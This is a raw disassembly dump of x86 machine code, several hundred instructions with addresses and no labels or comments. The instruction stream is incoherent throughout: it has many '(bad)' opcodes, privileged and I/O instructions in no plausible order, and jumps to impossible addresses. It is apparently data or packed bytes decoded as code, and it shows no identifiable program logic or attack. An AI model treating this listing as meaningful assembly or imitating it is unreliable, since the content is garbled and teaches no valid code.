  4319d2:	gs cmp al,0x0
  4319d5:	je     0x4319ad
  4319d7:	push   eax
  4319d8:	sar    BYTE PTR [eax],1
  4319da:	mov    bh,0x3e
  4319dc:	push   cs
  4319dd:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4319e3:	add    DWORD PTR [ecx+0x12],ebp
  4319e6:	dec    edx
  4319e7:	(bad)  
  4319e8:	mov    eax,edx
  4319ea:	in     al,dx
  4319eb:	adc    DWORD PTR [ecx],esi
  4319ed:	pop    esi
  4319ee:	inc    ecx
  4319ef:	leave  
  4319f0:	or     DWORD PTR [eax],ebx
  4319f2:	gs push ebp
  4319f4:	add    ah,ch
  4319f6:	into   
  4319f7:	in     al,dx
  4319f8:	enter  0xb756,0xf0
  4319fc:	push   cs
  4319fd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431a07:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431a0d:	jnp    0x74439f15
  431a13:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a19:	add    BYTE PTR [edi],cl
  431a1b:	mov    edi,DWORD PTR [ecx-0x78]
  431a1e:	ltr    WORD PTR [ecx-0x7b]
  431a22:	dec    DWORD PTR [edi]
  431a24:	clc    
  431a25:	out    0x45,eax
  431a27:	add    BYTE PTR [eax],cl
  431a29:	cmp    ebx,0xffffff8c
  431a2c:	jge    0x431a2e
  431a2e:	jb     0x431a40
  431a30:	je     0x521ab0
  431a36:	pop    edx
  431a37:	push   esi
  431a38:	mov    ecx,DWORD PTR [edi]
  431a3a:	in     al,dx
  431a3b:	rol    DWORD PTR [ebp+0x0],1
  431a3e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431a45:	cmp    DWORD PTR [ecx],0xfffffff0
  431a48:	hlt    
  431a49:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431a4f:	(bad)  
  431a51:	push   eax
  431a52:	jns    0xb842fed0
  431a58:	lock push cs
  431a5a:	ror    edx,0x3
  431a5d:	test   BYTE PTR [ecx+0x5500e800],cl
  431a63:	dec    eax
  431a64:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a68:	(bad)  
  431a69:	mov    esi,0x7f33ff5f
  431a6e:	inc    eax
  431a6f:	test   DWORD PTR [edx],eax
  431a71:	je     0x431a33
  431a73:	mov    ecx,ecx
  431a75:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a79:	and    eax,DWORD PTR [eax+0xf0103]
  431a7f:	jp     0x431a6d
  431a81:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431a85:	add    edx,DWORD PTR [edi+0x74]
  431a88:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431a8e:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a94:	je     0x431a19
  431a96:	cmp    eax,edi
  431a98:	js     0x431abd
  431a9a:	add    eax,0xeb0fc003
  431a9f:	jns    0x431a2c
  431aa1:	vmread DWORD PTR [ecx+0x45],ebx
  431aa5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431aab:	adc    al,0x8b
  431aad:	jge    0x431ac3
  431aaf:	mov    edi,DWORD PTR [eax-0x4]
  431ab2:	add    edi,DWORD PTR [edi]
  431ab4:	or     bh,bh
  431ab6:	push   ebp
  431ab7:	push   es
  431ab8:	mov    DWORD PTR [ebp-0x4],ebx
  431abb:	add    edi,esi
  431abd:	pop    es
  431abe:	add    esi,DWORD PTR [edi-0x48ccf183]
  431ac4:	mov    DWORD PTR [esp+esi*8],ecx
  431ac7:	inc    ebp
  431ac8:	pop    ebp
  431ac9:	xor    DWORD PTR [esi-0x4],0x3b
  431acd:	add    edx,DWORD PTR [ecx+edi*1]
  431ad0:	push   es
  431ad1:	clc    
  431ad2:	mov    bh,0xdb
  431ad4:	jp     0x431a8d
  431ad6:	add    cl,BYTE PTR [esi]
  431ad8:	div    DWORD PTR [edi+0x4d8b0c1c]
  431ade:	test   edi,edi
  431ae0:	je     0x431ad6
  431ae2:	mov    eax,ecx
  431ae4:	or     BYTE PTR [ebx],al
  431ae6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431aec:	jbe    0x431b60
  431aee:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431af4:	add    ecx,DWORD PTR [esi]
  431af6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431afc:	add    eax,DWORD PTR [ebx-0x287af783]
  431b02:	je     0x431b51
  431b04:	mov    DWORD PTR [ecx],edi
  431b06:	mov    esi,eax
  431b08:	hlt    
  431b09:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431b10:	jb     0x431ad2
  431b12:	jmp    0x431aff
  431b14:	xor    esi,DWORD PTR [ebx]
  431b16:	pop    edi
  431b17:	pop    esi
  431b18:	pop    ebx
  431b19:	ret    
  431b1a:	ret    0x8b
  431b1d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b23:	xor    DWORD PTR [ecx],0xc
  431b26:	pushf  
  431b27:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b2d:	rdmsr  
  431b2f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431b36:	dec    ebp
  431b37:	ret    
  431b38:	mov    edi,DWORD PTR [esi-0x4]
  431b3b:	pop    eax
  431b3c:	dec    ebp
  431b3d:	jne    0x431aca
  431b3f:	xor    edi,esp
  431b41:	inc    eax
  431b42:	dec    ebp
  431b43:	jbe    0x431b98
  431b45:	inc    eax
  431b46:	pop    ebp
  431b47:	add    edx,DWORD PTR [esi+0x8]
  431b4a:	push   esp
  431b4b:	dec    eax
  431b4c:	push   ecx
  431b4d:	mov    eax,edi
  431b4f:	and    al,0xf0
  431b51:	jo     0x431b3e
  431b53:	mov    eax,DWORD PTR [ebx]
  431b55:	sbb    BYTE PTR [ebp+0x4d],cl
  431b58:	mov    eax,DWORD PTR [ebx]
  431b5a:	nop
  431b5b:	or     BYTE PTR [eax],al
  431b5d:	jne    0x431bb6
  431b5f:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431b65:	cld    
  431b66:	xor    edi,edi
  431b68:	add    edi,DWORD PTR [ebp+0x3]
  431b6b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b71:	js     0x431af7
  431b73:	jae    0x431b77
  431b75:	(bad)  
  431b77:	xor    al,0x5d
  431b79:	jmp    0x431b06
  431b7b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b82:	fdecstp 
  431b84:	test   BYTE PTR [edi],ah
  431b86:	add    bh,BYTE PTR [ebp+0x0]
  431b89:	add    ebx,DWORD PTR [ebp-0x77]
  431b8c:	mov    edi,eax
  431b8e:	cmp    al,0x0
  431b91:	adc    dh,BYTE PTR [ebx]
  431b93:	jge    0x431b98
  431b95:	mov    edi,DWORD PTR [ebx]
  431b97:	jl     0x431ba8
  431b99:	clc    
  431b9a:	dec    edi
  431b9b:	jge    0x431b9d
  431b9d:	mov    eax,DWORD PTR [ebx]
  431b9f:	jb     0x431ba9
  431ba1:	mov    ecx,DWORD PTR [ebp-0x8]
  431ba4:	mov    edi,edi
  431ba6:	xor    edx,DWORD PTR [eax]
  431ba8:	add    edi,DWORD PTR [ebx]
  431baa:	mov    DWORD PTR [ebp-0x10],edi
  431bad:	inc    edi
  431bae:	pop    ebp
  431baf:	jge    0x431bec
  431bb1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431bb5:	mov    edx,0xc05d87f0
  431bba:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431bbe:	fimul  WORD PTR [eax]
  431bc0:	fist   WORD PTR [ebp+0x1c]
  431bc3:	in     al,dx
  431bc4:	jne    0x431bb2
  431bc6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431bcc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431bd0:	fdivp  st(0),st
  431bd2:	fild   WORD PTR [ebp+0x4510f85c]
  431bd8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431bde:	inc    ebp
  431bdf:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431be5:	mov    ebp,DWORD PTR [ebx-0x4]
  431be8:	adc    al,0x8b
  431bea:	rcl    DWORD PTR [eax],0x48
  431bed:	mov    esi,0x7080803
  431bf2:	fiadd  WORD PTR [ebp+0x4d]
  431bf5:	(bad)  
  431bf6:	mov    edx,DWORD PTR [edx-0x4]
  431bf9:	mov    edx,DWORD PTR [ebp-0x4]
  431bfc:	xor    ebx,DWORD PTR [ebx+0x330103]
  431c02:	mov    DWORD PTR [edi+0x872dc],edi
  431c08:	xlat   BYTE PTR ds:[ebx]
  431c09:	into   
  431c0a:	ffreep st(6)
  431c0c:	retf   0x6c7
  431c0f:	iret   
  431c10:	dec    ebp
  431c11:	inc    ebp
  431c12:	mov    DWORD PTR [ebx],edi
  431c14:	fmul   QWORD PTR [edi]
  431c16:	dec    ebp
  431c17:	jnp    0x431c4c
  431c19:	add    BYTE PTR [ebx],al
  431c1b:	mov    ecx,DWORD PTR [esp+edi*8]
  431c1e:	inc    ebp
  431c1f:	dec    ebp
  431c20:	lea    esi,[ebx]
  431c22:	add    DWORD PTR [ebx],eax
  431c24:	jb     0x431c61
  431c26:	add    BYTE PTR [edi],cl
  431c28:	inc    ebp
  431c29:	imul   eax,edi,0x858bd800
  431c2f:	cld    
  431c30:	clc    
  431c31:	mov    DWORD PTR [ebp+0x0],eax
  431c34:	inc    DWORD PTR [eax]
  431c36:	or     al,0xde
  431c38:	sbb    bh,0x1
  431c3b:	retf   
  431c3c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431c43:	dec    ebp
  431c44:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431c4a:	enter  0x12de,0xdf
  431c4e:	inc    ebp
  431c4f:	pop    ebp
  431c50:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c56:	add    DWORD PTR [edx],edx
  431c58:	add    BYTE PTR [ebp+0x50],dl
  431c5b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c61:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431c67:	or     ah,al
  431c69:	pop    ss
  431c6a:	cdq    
  431c6b:	push   ebp
  431c6c:	clc    
  431c6d:	mov    eax,DWORD PTR [ebp-0x4]
  431c70:	xor    edx,edx
  431c72:	add    esi,DWORD PTR [ebx]
  431c74:	cmp    eax,DWORD PTR [ebx]
  431c76:	hlt    
  431c77:	cmp    DWORD PTR [ebx],esp
  431c79:	or     al,BYTE PTR [ebp+0xf]
  431c7c:	mov    eax,DWORD PTR [edx]
  431c7e:	loopne 0x431c80
  431c80:	(bad)  
  431c81:	mov    ecx,esi
  431c83:	cld    
  431c84:	pushf  
  431c85:	pop    ebp
  431c86:	fwait
  431c87:	mov    esi,DWORD PTR [edx]
  431c89:	lock mov eax,eax
  431c8c:	adc    BYTE PTR [ebx],al
  431c8e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c95:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c9b:	dec    ebp
  431c9c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431ca2:	(bad)  
  431ca3:	iret   
  431ca4:	inc    ebp
  431ca5:	(bad)  
  431ca6:	jne    0x431cf5
  431ca8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431cae:	(bad)  
  431caf:	cmp    ebx,eax
  431cb1:	je     0x431c39
  431cb3:	add    edi,edi
  431cb5:	or     bh,bh
  431cb7:	dec    ebp
  431cb8:	inc    ebp
  431cb9:	mov    esi,DWORD PTR [ebx]
  431cbb:	cld    
  431cbc:	add    ecx,esi
  431cbe:	cmp    ecx,DWORD PTR [eax-0xc]
  431cc1:	mov    edx,DWORD PTR [edi]
  431cc3:	or     BYTE PTR [ebp-0x7c],al
  431cc6:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431ccc:	test   BYTE PTR [ebx+ebx*4],cl
  431ccf:	inc    ebp
  431cd0:	xor    bh,BYTE PTR [esi]
  431cd2:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431cd9:	jne    0x431ca2
  431cdb:	mov    ebp,esp
  431cdd:	fcomp  DWORD PTR [ebx]
  431cdf:	add    BYTE PTR [ecx],al
  431ce1:	inc    DWORD PTR [ebp-0x75]
  431ce4:	(bad)  
  431ce5:	cld    
  431ce6:	add    al,0xce
  431ce8:	mov    ecx,edi
  431cea:	cld    
  431ceb:	inc    ebp
  431cec:	fidivr WORD PTR [ebx]
  431cee:	fbstp  TBYTE PTR [ebp-0x3e]
  431cf1:	mov    eax,DWORD PTR [eax]
  431cf3:	adc    BYTE PTR [ebx-0x3974038b],cl
  431cf9:	fadd   st,st(7)
  431cfb:	add    BYTE PTR [ebp-0x1],al
  431cfe:	mov    ecx,DWORD PTR [esp+edi*8]
  431d01:	inc    ebp
  431d02:	mov    bh,0xc7
  431d05:	loopne 0x431d4c
  431d07:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431d0d:	sbb    dh,BYTE PTR [ebx]
  431d0f:	pushf  
  431d10:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d16:	mov    eax,edi
  431d18:	cwde   
  431d19:	inc    ebp
  431d1a:	inc    ebp
  431d1b:	jne    0x431ca8
  431d1d:	mov    esp,esp
  431d1f:	clc    
  431d20:	add    al,0x4d
  431d22:	mov    DWORD PTR [ebx],esi
  431d24:	or     al,0x33
  431d26:	inc    ebp
  431d27:	lea    ecx,[ebx-0x398d13fd]
  431d2d:	add    bh,al
  431d2f:	inc    ebp
  431d30:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431d37:	add    ebp,esp
  431d39:	shufps xmm1,xmm3,0xc7
  431d3d:	(bad)  
  431d3e:	jmp    0x74885867
  431d43:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431d49:	hlt    
  431d4a:	mov    ecx,DWORD PTR [edi]
  431d4c:	fadd   DWORD PTR [ebp+0x0]
  431d4f:	xor    ecx,DWORD PTR [edi]
  431d51:	add    ecx,ecx
  431d53:	cmp    edi,edi
  431d55:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d59:	(bad)  
  431d5a:	jmp    0x431ce7
  431d5c:	mov    edi,esp
  431d5e:	or     al,0xc6
  431d60:	inc    ebp
  431d61:	(bad)  
  431d62:	mov    eax,DWORD PTR [ebp+0x10]
  431d65:	jne    0x431cf0
  431d67:	mov    eax,DWORD PTR [ecx]
  431d69:	clc    
  431d6a:	add    BYTE PTR [ebp-0x40],cl
  431d6d:	xor    edx,DWORD PTR [eax-0x73]
  431d70:	jne    0x431d73
  431d72:	push   DWORD PTR [edx+0x8]
  431d75:	add    BYTE PTR [ebp+0x45],al
  431d78:	mov    ebp,ecx
  431d7a:	cld    
  431d7b:	add    BYTE PTR [ebp+0x0],cl
  431d7e:	xor    eax,DWORD PTR [ebp+0x3]
  431d81:	mov    DWORD PTR [ebx],edi
  431d83:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d89:	sub    eax,0x5d330e4d
  431d8e:	lea    esi,[ebx]
  431d90:	add    DWORD PTR [ebx],eax
  431d92:	jb     0x431d7d
  431d94:	add    BYTE PTR [eax],al
  431d96:	inc    ebp
  431d97:	add    bl,ch
  431d99:	inc    ebp
  431d9a:	mov    esi,DWORD PTR [ebx]
  431d9c:	or     al,0x3
  431d9e:	(bad)  
  431d9f:	mov    edi,eax
  431da1:	in     al,dx
  431da2:	scas   eax,DWORD PTR es:[edi]
  431da3:	inc    ebp
  431da4:	mov    esi,DWORD PTR [ebx]
  431da6:	in     al,0x3
  431da8:	add    al,0x89
  431daa:	mov    ecx,DWORD PTR [eax+edi*8]
  431dad:	dec    ebp
  431dae:	(bad)  
  431daf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431db6:	mov    ecx,eax
  431db8:	cld    
  431db9:	push   es
  431dba:	dec    ebp
  431dbb:	add    al,0x33
  431dbd:	mov    DWORD PTR [ebx],eax
  431dbf:	in     al,dx
  431dc0:	cmp    DWORD PTR [ebp-0x67],eax
  431dc3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431dc9:	mov    edx,DWORD PTR [ebp-0x4]
  431dcc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431dcf:	xor    eax,DWORD PTR [ebp+0x3]
  431dd2:	cmp    DWORD PTR [ebx],0x8b32749a
  431dd8:	xor    edi,esp
  431dda:	jmp    0xff771b2c
  431ddf:	add    ecx,DWORD PTR [ebp-0x3f]
  431de2:	xor    ebx,DWORD PTR [edi]
  431de4:	add    eax,ecx
  431de6:	cmp    ebx,DWORD PTR [eax]
  431de8:	mov    ecx,DWORD PTR [ebp-0x4]
  431deb:	mov    ecx,DWORD PTR [eax]
  431ded:	adc    BYTE PTR [ebp-0x80],al
  431df0:	jmp    0x431df3
  431df2:	mov    eax,DWORD PTR [eax]
  431df4:	cld    
  431df5:	mov    bh,0xc6
  431df7:	push   ecx
  431df8:	(bad)  
  431df9:	jne    0x431e59
  431dfb:	dec    ecx
  431dfd:	or     BYTE PTR [ecx+ebx*1],cl
  431e00:	push   ebp
  431e01:	inc    ebp
  431e02:	in     al,dx
  431e03:	add    ebp,esp
  431e05:	or     bh,al
  431e07:	dec    ebp
  431e08:	cld    
  431e09:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431e0f:	xor    DWORD PTR [edx],0x2
  431e12:	pushf  
  431e13:	dec    DWORD PTR [ebx+0x45510cf4]
  431e19:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e1f:	mov    edx,DWORD PTR [ecx+0xc]
  431e22:	xor    eax,esi
  431e24:	mov    edx,0xc172c7
  431e29:	inc    ebp
  431e2a:	mov    esi,DWORD PTR [ebp+0x8]
  431e2d:	mov    eax,edx
  431e2f:	call   0x84c7e524
  431e34:	add    DWORD PTR [ebx-0x76bace00],ebx
  431e3a:	mov    ebp,eax
  431e3c:	or     BYTE PTR [eax],dl
  431e3e:	jo     0x431e8d
  431e40:	push   edi
  431e41:	xor    esi,DWORD PTR [ebp+0x3]
  431e44:	(bad)  
  431e45:	pmulhuw mm0,mm1
  431e48:	test   DWORD PTR [ebp-0x8],ecx
  431e4b:	mov    DWORD PTR [ebp-0x67],eax
  431e4e:	mov    eax,DWORD PTR [ebp-0x4]
  431e51:	xor    edi,DWORD PTR [ebp-0x73]
  431e54:	xor    eax,DWORD PTR [ebx]
  431e56:	xor    esi,DWORD PTR [edx+0x3]
  431e59:	add    BYTE PTR [ecx],bh
  431e5b:	inc    ebp
  431e5c:	(bad)  
  431e5d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e63:	mov    DWORD PTR [eax],0x750f0004
  431e69:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e6f:	lock add BYTE PTR [ebp+0x0],cl
  431e73:	mov    esi,DWORD PTR [ebp-0x18]
  431e76:	mov    ebp,edx
  431e78:	or     al,0x72
  431e7a:	ja     0x431e7c
  431e7c:	mov    edx,esi
  431e7e:	cld    
  431e7f:	(bad)  
  431e82:	cli    
  431e83:	mov    esi,DWORD PTR [ebp-0x4]
  431e86:	cmp    ecx,esi
  431e88:	bswap  edi
  431e8a:	(bad)
  431e8e:	mov    esi,DWORD PTR [ebp-0x4]
  431e91:	mov    esi,ecx
  431e93:	clc    
  431e94:	repnz add esi,DWORD PTR [ebp+0x45]
  431e98:	push   ebx
  431e99:	xor    eax,DWORD PTR [ebp+0x3]
  431e9c:	cmp    al,0x5f
  431e9e:	pushf  
  431e9f:	pop    ebx
  431ea0:	jmp    0x431f67
  431ea5:	mov    esi,DWORD PTR [ebp-0x7d]
  431ea8:	xor    ebp,DWORD PTR [eax]
  431eaa:	lea    eax,[ebp-0x8]
  431ead:	xor    edx,esi
  431eaf:	pushf  
  431eb0:	out    dx,eax
  431eb1:	(bad)  
  431eb2:	neg    eax
  431eb4:	ins    DWORD PTR es:[edi],dx
  431eb5:	test   esi,edi
  431eb7:	clc    
  431eb8:	pop    esp
  431eb9:	inc    ebp
  431eba:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431ec0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431ec6:	add    cl,al
  431ec8:	jne    0x431e65
  431eca:	mov    esi,DWORD PTR [edx]
  431ecc:	in     al,dx
  431ecd:	push   esi
  431ece:	xor    BYTE PTR [ebp-0xe],dh
  431ed1:	add    edi,esi
  431ed3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431ed9:	add    cl,bh
  431edb:	mov    edi,DWORD PTR [ebp+0x8]
  431ede:	mov    DWORD PTR [ebp-0x14],esi
  431ee1:	add    esi,DWORD PTR [ebp+0x3c]
  431ee4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431eea:	mov    ah,0x3e
  431eec:	fwait
  431eed:	pushf  
  431eee:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431ef4:	jne    0x431e81
  431ef6:	mov    ecx,DWORD PTR [esp+ebp*8]
  431ef9:	icebp  
  431efa:	icebp  
  431efb:	shl    edx,0xf2
  431efe:	(bad)  
  431eff:	mov    ah,0x16
  431f01:	push   eax
  431f02:	jne    0x431e97
  431f04:	mov    ecx,DWORD PTR [edi]
  431f06:	in     al,dx
  431f07:	jmp    0x431efa
  431f09:	add    dl,dh
  431f0b:	mov    edi,esi
  431f0d:	or     al,0x8
  431f0f:	inc    ebp
  431f10:	jne    0x431f15
  431f12:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f18:	ret    
  431f19:	or     bh,bh
  431f1b:	jge    0x431f05
  431f1d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f23:	xor    edi,eax
  431f25:	add    esi,DWORD PTR [ebp-0x77]
  431f28:	mov    ebx,esp
  431f2a:	clc    
  431f2b:	neg    DWORD PTR [ebp-0x7c]
  431f2e:	xor    eax,DWORD PTR [eax]
  431f30:	cmp    eax,DWORD PTR [eax]
  431f32:	repz jne 0x431eca
  431f35:	xor    eax,DWORD PTR [ecx]
  431f37:	add    ebx,DWORD PTR [eax]
  431f39:	mov    DWORD PTR [ebp-0x8],eax
  431f3c:	mov    eax,edi
  431f3e:	cld    
  431f3f:	lock pop eax
  431f41:	test   DWORD PTR [ebx],esi
  431f43:	clc    
  431f44:	add    edx,DWORD PTR [edi-0x740bff77]
  431f4a:	fdivp  st(4),st
  431f4c:	test   ecx,esi
  431f4e:	(bad)  
  431f4f:	jnp    0x431f50
  431f51:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f57:	jae    0x431ee4
  431f59:	sub    edi,esp
  431f5b:	(bad)  
  431f5c:	shl    DWORD PTR [eax-0x3e],0x89
  431f60:	leave  
  431f61:	call   0x8198d66e
  431f66:	in     al,dx
  431f67:	(bad)  
  431f68:	in     al,dx
  431f69:	add    bh,al
  431f6b:	mov    esp,edi
  431f6d:	in     al,dx
  431f6e:	test   DWORD PTR [ebp-0x8],edi
  431f71:	mov    eax,DWORD PTR [ebp+0x2b]
  431f74:	xor    al,BYTE PTR [ebx]
  431f76:	pushf  
  431f77:	jnp    0x57321bb0
  431f7d:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431f81:	loopne 0x431fb6
  431f83:	jne    0x431f40
  431f85:	mov    esi,DWORD PTR [edx-0x20]
  431f88:	add    BYTE PTR [ebp-0x3d],bh
  431f8b:	xor    eax,DWORD PTR [ebp-0x73]
  431f8e:	mov    edi,DWORD PTR [esi]
  431f90:	cld    
  431f91:	jb     0x431f59
  431f93:	add    bl,al
  431f95:	jne    0x431fdc
  431f97:	mov    edx,DWORD PTR [edi-0x10]
  431f9a:	jge    0x432019
  431f9c:	mov    esi,DWORD PTR [ebx]
  431f9e:	lock add ecx,DWORD PTR [ebp+0x3b]
  431fa2:	xor    esi,DWORD PTR [ebp-0x77]
  431fa5:	mov    esi,eax
  431fa7:	lock inc ebp
  431fa9:	jge    0x431fdc
  431fab:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431fb2:	dec    ebp
  431fb3:	mov    esi,DWORD PTR [ebx]
  431fb5:	loopne 0x431f40
  431fb7:	jge    0x431fb1
  431fb9:	add    DWORD PTR [ebp-0x7d],eax
  431fbc:	icebp  
  431fbd:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431fc4:	dec    ebp
  431fc5:	hlt    
  431fc6:	xor    ebx,DWORD PTR [ebp-0x77]
  431fc9:	mov    esi,esp
  431fcb:	in     al,0x45
  431fcd:	jge    0x43200c
  431fcf:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431fd6:	dec    ebp
  431fd7:	push   esp
  431fd8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431fde:	inc    ebp
  431fdf:	hlt    
  431fe0:	xor    DWORD PTR [ebp-0x61],esi
  431fe3:	mov    edi,DWORD PTR [eax+0xf19504]
  431fe9:	repnz mov DWORD PTR [ebp+0x20],ebx
  431fed:	cmp    eax,DWORD PTR [ebp+0xf]
  431ff0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ff4:	fistp  WORD PTR [ebx+0x0]
  431ff7:	inc    ebp
  431ff8:	mov    ebx,DWORD PTR [edi+0xc]
  431ffb:	add    eax,eax
  431ffd:	inc    ebp
  431ffe:	test   BYTE PTR [ebx],dh
  432000:	add    eax,DWORD PTR [ebx]
  432002:	add    BYTE PTR [esi+0x45],bl
  432005:	ret    0x85
  432008:	jnp    0x5443a3d7
  43200e:	inc    bp
  432010:	inc    ebp
  432011:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432017:	fdiv   QWORD PTR [ebx]
  432019:	test   DWORD PTR [ecx+0x453bf8],edi
  43201f:	push   ebx
  432020:	add    edi,DWORD PTR [esi+0x708088b]
  432026:	cmp    esi,eax
  432028:	setnp  BYTE PTR [ecx-0x74fcffce]
  43202f:	mov    esp,edi
  432031:	call   0x33ce6583
  432036:	or     BYTE PTR [ebx],al
  432038:	inc    ecx
  432039:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  43203f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432045:	lock add cl,al
  432048:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  43204f:	mov    ch,0x45
  432051:	clc    
  432052:	xor    eax,DWORD PTR [ebp+0x3]
  432055:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  43205b:	inc    ebp
  43205c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432062:	mov    edi,eax
  432064:	mov    eax,DWORD PTR [ebp+0x3c]
  432067:	mov    ecx,DWORD PTR [eax]
  432069:	hlt    
  43206a:	inc    ebp
  43206b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432072:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432078:	push   ebp
  432079:	mov    edi,DWORD PTR [ebx]
  43207b:	in     al,dx
  43207c:	jne    0x43203f
  43207e:	mov    eax,DWORD PTR [ebp-0x28]
  432081:	add    DWORD PTR [eax],0xe8058dec
  432087:	clc    
  432088:	mov    esi,DWORD PTR [edi-0x8]
  43208b:	add    dh,dl
  43208d:	rol    WORD PTR [ebp-0x1],cl
  432091:	mov    edx,DWORD PTR [eax+0x8]
  432094:	jne    0x432056
  432096:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  43209d:	inc    ebp
  43209e:	push   esp
  43209f:	test   DWORD PTR [ecx+0xf],ecx
  4320a2:	sub    edx,esp
  4320a4:	add    eax,DWORD PTR [eax]
  4320a6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4320ac:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4320b3:	mov    eax,DWORD PTR [ecx]
  4320b5:	and    BYTE PTR [eax],al
  4320b7:	cmp    al,0x10
  4320b9:	add    BYTE PTR [ebp+0x66],al
  4320bc:	inc    ecx
  4320be:	push   esp
  4320bf:	add    dh,BYTE PTR [ebp+0x0]
  4320c2:	push   edx
  4320c3:	enterw 0xc1,0x4d
  4320c8:	mov    esp,DWORD PTR [esi+0x20]
  4320cb:	add    DWORD PTR [ecx-0x7b],eax
  4320ce:	add    eax,DWORD PTR [ebx]
  4320d0:	str    WORD PTR [eax+0x45]
  4320d4:	lea    ecx,[ebx+0x45890801]
  4320da:	sbb    BYTE PTR [ebx],al
  4320dc:	dec    ebp
  4320dd:	cmp    al,0xf
  4320df:	inc    ebp
  4320e0:	push   eax
  4320e1:	mov    esi,DWORD PTR [ebx]
  4320e3:	push   eax
  4320e4:	add    eax,eax
  4320e6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4320ed:	inc    ebp
  4320ee:	add    BYTE PTR [ecx],dh
  4320f0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4320f7:	(bad)  
  4320f8:	mov    ebx,eax
  4320fa:	loopne 0x432141
  4320fc:	dec    ebp
  4320fd:	mov    ecx,DWORD PTR [edi]
  4320ff:	cld    
  432100:	push   eax
  432101:	xchg   DWORD PTR [ebx],esi
  432103:	add    DWORD PTR [ebx],ebp
  432105:	add    BYTE PTR [ebx],ch
  432107:	or     BYTE PTR [ecx],bh
  432109:	dec    ecx
  43210a:	loopne 0x43210f
  43210c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432112:	push   ebp
  432113:	add    DWORD PTR [ebx+0x55100800],eax
  432119:	dec    ebp
  43211a:	jmp    0x4320a5
  43211c:	mov    esp,DWORD PTR [eax]
  43211e:	sbb    dl,dl
  432120:	inc    eax
  432121:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432127:	add    BYTE PTR [ebx+0x74528555],cl
  43212d:	push   ebp
  43212e:	div    DWORD PTR [ebx]
  432130:	and    eax,DWORD PTR [ebx]
  432132:	add    edx,DWORD PTR [edx-0x30]
  432135:	jno    0x4320c2
